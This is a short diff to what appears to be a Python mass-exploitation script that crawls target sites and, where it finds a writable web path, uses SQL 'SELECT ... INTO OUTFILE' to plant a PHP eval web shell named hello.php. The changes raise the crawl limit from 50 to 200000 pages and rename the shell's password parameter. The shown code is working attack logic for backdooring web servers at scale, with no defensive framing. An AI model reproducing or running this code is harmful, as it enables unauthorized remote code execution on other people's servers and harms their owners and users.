@@ -41,7 +41,7 @@ if __name__ == "__main__":
     target_urls = []
     target_urls.append(url)
 
-    page_num = 50 #想多少页就多少页。。只要你有。。
+    page_num = 200000 #想多少页就多少页。。只要你有。。
 
     for cnt in range(page_num):
         if target_urls[cnt] == "END_FLAG":
@@ -97,7 +97,7 @@ if __name__ == "__main__":
 
                     if path:
                         path = path+'/hello.php'
-                        sql = ["Drop TABLE IF EXISTS xbclub;","Create TABLE xbclub(cmd text NOT NULL);","Insert INTO xbclub (cmd) VALUES('<?php @eval($_POST[123])?>');","Select cmd from xbclub into outfile '"+path+"';","Drop TABLE IF EXISTS xbclub;"]
+                        sql = ["Drop TABLE IF EXISTS xbclub;","Create TABLE xbclub(cmd text NOT NULL);","Insert INTO xbclub (cmd) VALUES('<?php @eval($_POST['hanzs'])?>');","Select cmd from xbclub into outfile '"+path+"';","Drop TABLE IF EXISTS xbclub;"]
                         exp_headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
                         success_num = 0
                         for sql_cmd in sql:
